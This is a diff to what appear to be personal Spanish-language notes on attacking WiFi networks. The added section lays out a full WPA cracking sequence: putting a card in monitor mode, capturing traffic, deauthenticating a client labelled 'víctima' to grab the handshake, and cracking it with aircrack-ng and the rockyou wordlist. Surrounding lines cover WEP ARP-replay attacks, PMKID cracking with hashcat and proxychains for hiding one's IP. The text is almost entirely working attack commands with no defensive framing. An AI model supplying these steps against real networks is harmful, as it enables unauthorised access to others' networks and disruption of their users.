@@ -36,13 +36,25 @@ Ver   aireplay-ng   las opciones
 Prueba de inyección a todos:
 aireplay-ng --test wlan0mon        tiene que decir  Injection is working!, capturar la MAC del enrutador a atacar
 
-AIRODUMP ES SOLO PARA WEP
+SOLO PARA WEP
 airodump-ng -c 6 --bssid C0:C0:C0:C0:C0:C0 -w archivoSalida wlan0mon       c es el canal
 aireplay-ng --fakeauth 0 -e nombreDeLaRed -a C0:C0:C0:C0:C0:C0 -h C1:C1:C1:C1:C1:C1 wlan0mon      0 es el tiempo que demora en reconectar, C1 la MAC de un cliente conectado
 se autentifica
 inyectar paquetes específicos para dar con la clave de la red:
 aireplay-ng --arpreplay -b C0:C0:C0:C0:C0:C0 -h C1:C1:C1:C1:C1:C1 wlan0mon
 aircrack-ng -z -b C0:C0:C0:C0:C0:C0 captura-01.cap
+
+
+WPA
+airmon-ng                   ver tarjeta de red
+airmon-ng check kill        matar procesos
+airmon-ng start wlan0       modo monitor
+airodump-ng wlan0mon        ver conexiones disponibles
+airodump-ng --channel 6 --bssid 00:00:00:00:00:00 -w ~/Documents/scan wlan0mon        comienza a capturar paquetes
+aireplay-ng -0 26 -a 10:10:10:00:00:00 -c 00:00:00:00:00:00 wlan0mon    a es el mío, c la víctima, 26 paquetes
+inyecta paquetes para acelerar la captura de tráfico
+cancelar el proceso cuando WPA handshake: 10:10:10:00:00:00
+aircrack-ng scan-01.cap -w /usr/share/wordlists/rockyou.txt
 
 
 
@@ -55,7 +67,7 @@ Ataque a claves WPA con PMKID sin Deauth WPA/WPA2:
     hashcat -m 16800 hash.16800 -a 0 (--kernel-accel=1) -w 4 --force /usr/share/wordlist
 
 
-----------------------------------------------------------------------------------------------------------
+#################################################################################################################################
 
 PROXYCHAINS
 solo tcp, sirve para esconder la ip de las peticiones
